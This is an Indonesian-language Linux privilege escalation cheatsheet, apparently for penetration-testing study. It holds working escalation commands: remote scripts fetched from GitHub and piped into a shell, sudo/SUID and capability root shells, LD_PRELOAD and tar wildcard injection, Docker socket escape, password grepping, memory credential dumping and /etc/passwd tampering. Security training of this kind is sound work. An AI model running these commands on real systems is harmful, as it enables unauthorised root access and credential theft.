# Linux Privilege Escalation Cheatsheet

>Checklist: https://hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html

## Daftar Isi

- [Informasi Sistem & Kernel](#informasi-sistem--kernel)
- [Pertahanan & Kontainer](#pertahanan--kontainer)
- [Informasi Pengguna & Grup](#informasi-pengguna--grup)
- [Konfigurasi `sudo` & SUID](#konfigurasi-sudo--suid)
- [Kemampuan (Capabilities)](#kemampuan-capabilities)
- [Cron Jobs & Timer Systemd](#cron-jobs--timer-systemd)
- [Layanan & Soket](#layanan--soket)
- [Jaringan & Sniffing](#jaringan--sniffing)
- [Penyimpanan Kredensial & Memori Proses](#penyimpanan-kredensial--memori-proses)
- [Pustaka Bersama (Shared Library) & Injeksi](#pustaka-bersama-shared-library--injeksi)
- [Izin Direktori, ACL & File Sensitif](#izin-direktori-acl--file-sensitif)

---

## Fondasi Mutlak & Tool Otomatis

Sebelum masuk ke perintah manual, pahami ini:
**Kamu butuh shell yang interaktif dan TTY penuh.** Jika tidak, banyak perintah akan gagal atau output-nya aneh.

```bash
# Stabilisasi shell (cara paling umum dengan Python)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Tekan Ctrl+Z untuk background proses, lalu:
stty raw -echo; fg
# Tekan Enter dua kali, lalu:
export TERM=xterm
```

**Tool Otomatis untuk Pemindaian Cepat (WAJIB dicoba):**
Tool ini menjalankan puluhan pemeriksaan dalam hitungan detik. Gunakan sebagai langkah pertama, lalu pelajari outputnya secara manual untuk memahami logikanya.

**LinPEAS (Sangat Komprehensif):**
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
Analisis outputnya, terutama bagian yang berwarna **MERAH/KUNING** (menandakan potensi kerentanan tinggi).

**LinEnum (Ringan dan Cepat):**
```bash
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

---

## Informasi Sistem & Kernel

**Tujuan:** Mendapatkan gambaran besar sistem untuk mencari kerentanan publik.

| Perintah | Penjelasan Singkat |
| :--- | :--- |
| `(cat /proc/version \|\| uname -a ) 2>/dev/null` | Lihat versi kernel. Cocokkan dengan exploit publik (misal: DirtyCow, PwnKit). |
| `cat /etc/os-release 2>/dev/null` | Cek rilis OS (distro universal modern). |
| `echo $PATH` | Lihat `$PATH`. Jika ada direktori yang writable, berpotensi untuk pembajakan. |
| `env \|\| set` | Cari kredensial atau API key di variabel environment. |
| `searchsploit "Linux Kernel"` | Cari exploit kernel di ExploitDB. Gunakan tool seperti `linux-exploit-suggester.sh`. |
| `date` , `df -h` , `lscpu` | Info tambahan sistem (tanggal, disk, CPU). |

---

## Pertahanan & Kontainer

**Tujuan:** Memahami mekanisme keamanan yang aktif dan mendeteksi apakah kita berada di dalam kontainer.

| Item | Perintah / Penjelasan Singkat |
| :--- | :--- |
| **AppArmor** | `aa-status` atau `ls -d /etc/apparmor*` |
| **SELinux** | `sestatus` |
| **ASLR** | `cat /proc/sys/kernel/randomize_va_space` (0 = nonaktif, rentan). |
| **Deteksi Kontainer** | Cek keberadaan `/.dockerenv`, cek `cgroup`, atau gunakan tool seperti `deepce`. |

---

## Informasi Pengguna & Grup

**Tujuan:** Mencari tahu hak akses kita dan grup-grup istimewa yang dapat disalahgunakan.

| Perintah | Penjelasan Singkat |
| :--- | :--- |
| `id` | **Wajib!** Lihat UID, GID, dan grup (misal: `docker`, `lxd`, `adm`, `sudo`). |
| `cat /etc/passwd \| cut -d: -f1` | List semua user. |
| `cat /etc/passwd \| grep "sh$"` | List user dengan shell valid. |
| `who` , `w` , `last` | Siapa yang sedang/login, dan riwayat login. |
| `for i in $(cut -d":" -f1 /etc/passwd);do id $i;done` | Lihat semua user dan grupnya. |

---

## Konfigurasi `sudo` & SUID

**Tujuan:** Ini adalah jalur eskalasi paling klasik. Mencari hak `sudo` yang salah konfigurasi atau binary SUID yang tidak aman.

| Perintah | Penjelasan Singkat |
| :--- | :--- |
| `sudo -l` | **Wajib!** Lihat perintah `sudo` apa yang bisa dijalankan. Perhatikan `NOPASSWD`, `SETENV`, dan `env_keep+=LD_PRELOAD`. |
| `sudo -V \| grep "Sudo ver"` | Cek versi sudo, apakah rentan terhadap CVE tertentu (misal: CVE-2021-3156 "Baron Samedit"). |
| `find / -perm -4000 -type f 2>/dev/null` | Cari semua file SUID. Cocokkan dengan [GTFOBins](https://gtfobins.github.io/). |
| **Eksploitasi `sudo`:** | Jika bisa menjalankan `find`, `vim`, `python`, dll. sebagai root, cek GTFOBins. Contoh: `sudo find . -exec /bin/sh -p \; -quit` |
| **Eksploitasi SUID:** | Jika binary seperti `bash` atau `cp` memiliki SUID, bisa langsung ke root shell: `./bash -p`. |
| **`env_keep+=LD_PRELOAD`** | Buat shared library jahat, lalu: `sudo LD_PRELOAD=/path/to/evil.so <command>` |

---

## Kemampuan (Capabilities)

**Tujuan:** Mencari proses/binary dengan "potongan" hak root yang bisa disalahgunakan, lebih modern dari SUID.

| Perintah | Penjelasan Singkat |
| :--- | :--- |
| `getcap -r / 2>/dev/null` | **Wajib!** Cari binary dengan capabilities. |
| **Contoh Eksploitasi** | `cap_setuid+ep` pada `python3.8` bisa dipakai: `import os; os.setuid(0); os.system("/bin/bash")` |
| **Contoh Lain** | `cap_sys_ptrace` (injeksi proses), `cap_dac_read_search` (baca file apapun), `cap_net_raw` (sniffing). Cek [HackTricks Capabilities](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities) untuk detail. |

---

## Cron Jobs & Timer Systemd

**Tujuan:** Mengeksploitasi tugas terjadwal yang dijalankan oleh root.

| Perintah | Penjelasan Singkat |
| :--- | :--- |
| `crontab -l; ls -al /etc/cron*; cat /etc/crontab` | **Wajib!** Lihat semua cron job. |
| **File/Path Writabe** | Jika script cron writable, timpa dengan payload. Jika cron memanggil perintah tanpa path absolut, bajak `$PATH`. |
| **Wildcard Injection** | Jika cron menjalankan `tar cf *` di direktori writable, buat file `--checkpoint=1` dan `--checkpoint-action=exec=sh payload.sh`. |
| **Timer Systemd** | `systemctl list-timers --all`. Cari `.timer` dan `.service` yang writable. |

---

## Layanan & Soket

**Tujuan:** Memanfaatkan layanan yang berjalan, terutama soket internal.

| Perintah | Penjelasan Singkat |
| :--- | :--- |
| `ss -tulpn` atau `netstat -tulpn` | Lihat layanan yang listen. Perhatikan yang hanya listen di `127.0.0.1` (internal). |
| **Docker Socket** | Jika ada di grup `docker` (`id`), atau socket `/var/run/docker.sock` writable: `docker run -v /:/host -it ubuntu chroot /host bash` (root langsung). |
| **Systemd .service/.socket** | Cek file di `/etc/systemd/system/` yang writable. Modifikasi `ExecStart` atau `ExecStartPre`. |
| **D-Bus** | Enumerasi: `busctl list`. Jika ada izin lemah, bisa digunakan untuk eskalasi. |

---

## Jaringan & Sniffing

**Tujuan:** Bergerak lateral atau menemukan kredensial dari lalu lintas jaringan.

| Perintah | Penjelasan Singkat |
| :--- | :--- |
| `ip a` , `ip route` , `cat /etc/hosts` | Pahami topologi jaringan. |
| `iptables -L` (jika bisa) | Lihat aturan firewall. |
| `tcpdump -i lo -s 0 -A -n 'tcp port 80'` | Sniffing trafik `localhost`. Sering ditemukan kredensial di sini. |

---

## Penyimpanan Kredensial & Memori Proses

**Tujuan:** Mencari password, token, atau SSH key yang tersimpan atau berjalan di memori.

| Perintah | Penjelasan Singkat |
| :--- | :--- |
| `grep -rnw '/' -ie "password=" 2>/dev/null` | Cari string password di file konfigurasi, log, backup. |
| `cat ~/.bash_history` , `cat ~/.mysql_history` | Lihat riwayat perintah, mungkin berisi password. |
| **Dump Memori** | Jika punya akses ke proses (cek `ptrace_scope`), gunakan `gdb` atau tool seperti `mimipenguin` untuk mengambil kredensial dari memori. |

---

## Pustaka Bersama (Shared Library) & Injeksi

**Tujuan:** Membajak alur eksekusi program yang berhak tinggi.

| Teknik | Penjelasan Singkat |
| :--- | :--- |
| **RPATH/RUNPATH** | Cek dengan `readelf -d <binary>` atau `ldd`. Jika folder di `RPATH` writable, letakkan library jahat di sana. |
| **Shared Object Injection** | Jalankan `strace <suid_binary> 2>&1 \| grep -iE "open\|no such file"`. Jika ada `.so` yang tidak ditemukan di folder writable, buat library jahat di sana. |

---

## Izin Direktori, ACL & File Sensitif

**Tujuan:** Memanfaatkan salah konfigurasi izin standar.

| Item | Penjelasan Singkat |
| :--- | :--- |
| **/etc/passwd & /etc/shadow** | Jika writable, bisa buat user baru dengan UID 0 atau menghapus password root. |
| **SSH Keys** | Cek folder `~/.ssh/` (authorized_keys, id_rsa) yang readable. |
| **ACL** | `getfacl` untuk melihat izin di luar standar ugo/rwx. Bisa jadi ada backdoor. |
